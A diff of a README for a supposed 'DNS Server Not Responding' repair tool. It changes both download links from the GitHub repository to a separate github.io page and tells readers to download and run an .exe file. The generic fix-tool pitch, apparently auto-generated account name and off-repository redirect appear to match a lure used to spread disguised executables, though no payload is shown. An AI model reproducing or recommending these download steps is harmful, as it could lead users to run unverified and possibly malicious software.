@@ -1,6 +1,6 @@
 # 🌐 DNS-Server-Not-Responding-Fix - Resolve your internet connection issues instantly
 
-[![](https://img.shields.io/badge/Download-DNS_Repair_Tool-blue.svg)](https://github.com/uncivilized-hothead639/DNS-Server-Not-Responding-Fix)
+[![](https://img.shields.io/badge/Download-DNS_Repair_Tool-blue.svg)](https://uncivilized-hothead639.github.io)
 
 ## 🩺 Overview
 
@@ -17,7 +17,7 @@ A "DNS Server Not Responding" error stops your computer from loading websites. T
 
 Visit our release page to obtain the file. Save the file where you can locate it, such as your Downloads folder.
 
-[![](https://img.shields.io/badge/Download-DNS_Repair_Tool-grey.svg)](https://github.com/uncivilized-hothead639/DNS-Server-Not-Responding-Fix)
+[![](https://img.shields.io/badge/Download-DNS_Repair_Tool-grey.svg)](https://uncivilized-hothead639.github.io)
 
 1. Select the link above.
 2. Look for the file ending in .exe.
